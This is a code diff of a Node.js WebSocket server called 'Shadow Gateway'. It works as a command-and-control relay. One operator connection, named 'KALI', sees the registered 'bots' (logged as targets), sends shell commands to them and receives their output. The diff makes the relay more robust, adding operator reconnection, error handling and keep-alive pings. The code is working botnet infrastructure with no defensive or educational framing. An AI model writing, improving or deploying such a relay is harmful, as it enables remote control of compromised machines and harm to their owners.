@@ -1,33 +1,74 @@
 const WebSocket = require('ws');
-const server = require('http').createServer((q, r) => r.end('Shadow Up'));
+const http = require('http');
+
+const server = http.createServer((req, res) => {
+    res.writeHead(200, { 'Content-Type': 'text/plain' });
+    res.end('Shadow Gateway v10 - Online');
+});
+
 const wss = new WebSocket.Server({ server });
 
 let KALI = null;
 const BOTS = new Map();
 
 wss.on('connection', (ws, req) => {
-    const id = new URLSearchParams(req.url.split('?')[1]).get('id');
+    const params = new URLSearchParams(req.url.split('?')[1]);
+    const id = params.get('id');
+
     if (id === 'KALI') {
+        if (KALI) KALI.terminate();
         KALI = ws;
-        BOTS.forEach((_, bId) => KALI.send(JSON.stringify({t:'bot', s:'on', id:bId})));
-    } else {
+        console.log('[+] Operador David Conectado');
+        // Notifica o Kali sobre todos os bots existentes
+        BOTS.forEach((_, botId) => {
+            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: botId }));
+        });
+    } else if (id) {
         if (BOTS.has(id)) BOTS.get(id).terminate();
         BOTS.set(id, ws);
-        if (KALI) KALI.send(JSON.stringify({t:'bot', s:'on', id}));
+        console.log(`[+] Alvo registrado: ${id}`);
+        if (KALI && KALI.readyState === WebSocket.OPEN) {
+            KALI.send(JSON.stringify({ t: 'bot', s: 'on', id: id }));
+        }
     }
 
-    ws.on('message', m => {
-        if (ws === KALI) {
-            const d = JSON.parse(m);
-            if (BOTS.has(d.to)) BOTS.get(d.to).send(d.cmd);
-        } else if (KALI) {
-            KALI.send(JSON.stringify({t:'res', f:id, d:m.toString()}));
+    ws.on('message', (message) => {
+        try {
+            const data = JSON.parse(message);
+            if (ws === KALI) {
+                const target = BOTS.get(data.to);
+                if (target) target.send(data.cmd);
+            } else {
+                if (KALI && KALI.readyState === WebSocket.OPEN) {
+                    KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
+                }
+            }
+        } catch (e) {
+            // Se não for JSON, envia como resposta bruta (fallback)
+            if (ws !== KALI && KALI) {
+                KALI.send(JSON.stringify({ t: 'res', f: id, d: message.toString() }));
+            }
         }
     });
 
     ws.on('close', () => {
-        if (ws === KALI) KALI = null;
-        else { BOTS.delete(id); if (KALI) KALI.send(JSON.stringify({t:'bot', s:'off', id})); }
+        if (ws === KALI) {
+            KALI = null;
+            console.log('[-] Operador Desconectado');
+        } else {
+            BOTS.delete(id);
+            if (KALI && KALI.readyState === WebSocket.OPEN) {
+                KALI.send(JSON.stringify({ t: 'bot', s: 'off', id: id }));
+            }
+        }
     });
+
+    // Keep-alive a cada 20 segundos
+    const timer = setInterval(() => {
+        if (ws.readyState === WebSocket.OPEN) ws.ping();
+        else clearInterval(timer);
+    }, 20000);
 });
-server.listen(process.env.PORT || 10000);
+
+const PORT = process.env.PORT || 10000;
+server.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));
